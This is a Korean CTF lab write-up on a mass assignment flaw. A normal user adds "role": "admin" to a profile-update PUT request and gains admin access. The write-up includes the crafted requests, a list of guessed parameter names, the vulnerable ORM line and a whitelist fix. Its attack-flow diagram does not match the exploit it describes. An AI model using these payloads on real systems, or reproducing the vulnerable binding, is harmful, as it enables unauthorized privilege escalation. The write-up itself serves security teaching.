+++
title = "VulnABLE CTF [LUXORA] Write-up: RBAC Bypass 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "RBAC", "Silver", "Mass Assignment", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: RBAC Bypass 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (RBAC Bypass)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/rbac/silver/profile/edit`
- **목표**: 회원 정보 수정 기능에서 발생하는 **Mass Assignment (대량 할당)** 취약점을 악용하여, 일반 유저인 내 계정의 Role(권한) 파라미터를 강제로 `admin`으로 승격시키고 시스템을 장악하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 API 분석 (Reconnaissance)

시스템에 일반 유저(`user_002`)로 로그인한 뒤, 내 프로필 수정(Profile Edit) 페이지에 들어갑니다.
이메일과 상태 메시지를 변경하고 [Save] 버튼을 누를 때, 프론트엔드가 백엔드로 보내는 API 요청을 확인합니다.

**[정상 프로필 수정 요청 패킷]**
```http
PUT /api/users/1002 HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Cookie: session=user_session_token

{
  "email": "hacker@luxora.test",
  "status": "Learning hacking!"
}
```

**[해커의 사고 과정]**
1. 이 API는 RESTful 구조의 `PUT` 메서드를 사용하여 내 정보를 업데이트하고 있다.
2. 백엔드 코드(Node.js나 Spring 등)는 아마도 들어온 JSON 객체의 모든 키-값 쌍을 그대로 DB의 Update 문에 매핑(Mass Assignment)하고 있을 가능성이 있다.
3. 데이터베이스 유저 테이블에는 보통 `id`, `email`, `status`, `password` 말고도 권한을 정의하는 **`role`** 이나 **`is_admin`** 같은 컬럼이 존재한다.
4. 만약 내가 JSON 바디(Body)에 몰래 `"role": "admin"` 이라는 데이터를 끼워 넣어서 보내면 어떻게 될까?

---

## 💥 2. 취약점 식별 및 데이터 주입 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Normal User ] --(GET /api/admin/users)--> [ Web Server ]
                                            |-- Missing Role Check
                                            |-- Returns Admin Data
```


이 취약점은 프레임워크가 제공하는 편리한 기능(객체를 DB 엔티티에 자동 매핑하는 기능)을 개발자가 무비판적으로 사용할 때 발생하는 **Mass Assignment (또는 Auto-Binding)** 취약점입니다.

### 💡 파라미터 유추 및 페이로드 조립
Burp Suite의 Repeater로 해당 요청을 보낸 뒤, JSON 본문에 권한 상승을 위한 파라미터를 추가합니다.

**[조작된 JSON 페이로드]**
```json
{
  "email": "hacker@luxora.test",
  "status": "I am Admin now!",
  "role": "admin",
  "is_admin": true
}
```
*(DB 컬럼명을 정확히 모를 경우 `role`, `role_id`, `is_admin`, `permissions` 등을 무작위로 여러 개 던져봅니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 요청을 서버로 전송합니다.

```http
PUT /api/users/1002 HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Cookie: session=user_session_token

{
  "email": "hacker@luxora.test",
  "status": "I am Admin now!",
  "role": "admin"
}
```

### 🔍 서버의 응답
서버는 수정 성공 메시지를 반환합니다.

```json
HTTP/1.1 200 OK

{
  "status": "success",
  "message": "Profile updated successfully.",
  "user": {
    "id": 1002,
    "email": "hacker@luxora.test",
    "status": "I am Admin now!",
    "role": "admin"
  }
}
```

응답 객체를 보니 내 계정의 `role`이 `admin`으로 확실하게 변경되었습니다!

### 권한 상승 확인
이제 브라우저를 새로고침 하거나 관리자 전용 대시보드(`/admin`)로 접근해 봅니다.
세션이나 DB의 내 계정 상태가 관리자로 업데이트되었으므로 시스템은 나를 최고 관리자로 대우하며 플래그를 뱉어냅니다.

```html
<h1>Welcome to the Admin Portal</h1>
<div class="flag">
  <p>FLAG{RBAC_🥈_MASS_ASSIGNMENT_E4F5G6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

클라이언트가 보낸 데이터 덩어리(JSON)를 필터링 없이 그대로 객체나 DB 모델에 바인딩하는 프레임워크의 허점을 이용하여, 숨겨진 관리자 속성을 강제로 덮어씌웠습니다.

**🔥 획득한 플래그:**
`FLAG{RBAC_🥈_MASS_ASSIGNMENT_E4F5G6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)

* **취약한 서버 로직 (Node.js/ORM 예시)**
```javascript
// req.body 안에 들어있는 모든 키(email, role 등)를 무조건 User 객체에 덮어씌움
const updatedUser = await User.update(req.body, { where: { id: req.user.id } });
```

* **안전한 패치 가이드 (명시적 필드 바인딩 및 DTO 사용)**
개발자는 **클라이언트가 수정할 수 있는 필드(Whitelist)**를 명확히 정의하고, 그 외의 필드(`role`, `id`, `password`)는 무시해야 합니다.

1. **DTO (Data Transfer Object) 활용**: (Java Spring 등) 
   수정 요청을 받을 때 `User` 엔티티 전체를 받지 말고, `UserUpdateRequest` 라는 DTO 클래스(email, status만 가짐)를 만들어서 받아야 합니다.
   
2. **명시적 할당 (Destructuring & Whitelisting)**: (Node.js 등)
   ```javascript
   // req.body에서 허용된 필드만 명시적으로 뽑아서 업데이트
   const { email, status } = req.body;
   const updatedUser = await User.update(
       { email, status }, // role은 들어갈 수 없음
       { where: { id: req.user.id } }
   );
   ```
이러한 방어 로직을 적용하면, 해커가 `"role": "admin"` 을 수천 번 보내도 해당 값은 공중으로 증발하고 DB에 반영되지 않습니다.